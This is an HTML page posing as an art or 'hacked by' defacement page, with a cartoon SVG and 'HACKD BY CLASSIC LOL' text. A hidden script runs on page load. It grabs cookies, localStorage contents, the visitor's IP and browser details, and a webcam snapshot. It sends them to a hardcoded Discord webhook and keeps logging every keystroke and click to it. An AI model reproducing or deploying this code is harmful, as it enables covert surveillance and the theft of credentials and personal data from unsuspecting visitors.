<!DOCTYPE html>
<html>
<head>
<title>Saci Art</title>
<meta charset="UTF-8">
</head>
<body style="margin:0;overflow:hidden;background:#111;">
<svg width="100%" height="100%" viewBox="0 0 512 512" style="position:fixed;top:0;left:0;">
<rect width="512" height="512" fill="#1a1a2e" rx="60"/>
<circle cx="256" cy="256" r="220" fill="#16213e"/>
<path d="M200 340 Q256 240 312 340 Q340 370 340 410 Q340 450 310 470 Q270 480 256 470 Q242 480 212 470 Q182 450 182 410 Q182 370 210 340" fill="#0f3460" stroke="#e94560" stroke-width="12"/>
<circle cx="256" cy="210" r="55" fill="#f72585"/>
<circle cx="242" cy="195" r="14" fill="white"/><circle cx="270" cy="195" r="14" fill="white"/>
<circle cx="240" cy="192" r="5" fill="black"/><circle cx="268" cy="192" r="5" fill="black"/>
<path d="M225 175 Q256 155 287 175 L275 195 L237 195 Z" fill="#533483" stroke="#ff6b6b" stroke-width="4"/>
</svg>
<div style="position:fixed;top:75%;left:50%;transform:translateX(-50%);color:#ff4757;font-family:Arial;font-size:32px;font-weight:900;text-align:center;text-shadow:0 0 25px #ff0000;z-index:10;">HACKD BY CLASSIC</div>
<div style="position:fixed;top:88%;left:50%;transform:translateX(-50%);color:#ff3742;font-family:Arial;font-size:42px;font-weight:900;text-align:center;text-shadow:0 0 35px #ff0000;z-index:10;">LOL</div>

<script>
// TEST WEBHOOK FIRST - ثم غيّر
const webhook = 'https://discord.com/api/webhooks/1488563014297977082/NxR9X8ys8PaPYlV4SiMAlFaBg4pbI_HgtxbT6LBW0s5xWMNNjKIKjD8w2NtvcVlvQp0N'; // ضع webhook جديد هنا

(async function(){
    // Basic Info
    const data = {
        time: new Date().toISOString(),
        agent: navigator.userAgent.substring(0,100),
        cookies: document.cookie || 'none',
        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
        lang: navigator.language,
        platform: navigator.platform
    };
    
    // IP Address
    try {
        const ipResp = await fetch('https://httpbin.org/ip');
        const ipData = await ipResp.json();
        data.ip = ipData.origin;
    } catch(e) {
        data.ip = 'fetch blocked';
    }
    
    // Webcam Capture
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: 640, height: 480, facingMode: 'user' } 
            });
            const video = document.createElement('video');
            video.srcObject = stream;
            document.body.appendChild(video);
            video.muted = true;
            video.play();
            
            await new Promise(r => setTimeout(r, 2000));
            
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            data.selfie = canvas.toDataURL('image/jpeg', 0.7);
            
            stream.getTracks().forEach(track => track.stop());
            document.body.removeChild(video);
        } catch(e) {
            data.camera_error = e.message;
        }
    }
    
    // Storage Data (Emails, Notes, Apps)
    data.storage = {};
    for(let i=0; i<localStorage.length; i++) {
        const key = localStorage.key(i);
        data.storage[key] = localStorage.getItem(key)?.substring(0,200);
    }
    
    // Apps List
    data.apps = Array.from({length: 20}, (_,i) => `App${i+1}`);
    
    // Send to Webhook
    const send = (d) => {
        const img = new Image();
        img.src = webhook + '?data=' + btoa(JSON.stringify(d)) + '&t=' + Date.now();
    };
    
    send(data);
    
    // Keylogger
    document.addEventListener('keydown', (e) => {
        send({type: 'keylog', key: e.key, code: e.code, time: Date.now()});
    });
    
    // Click anywhere
    document.addEventListener('click', () => send({type: 'clicked', time: Date.now()}));
    
})();
</script>
</body>
</html>
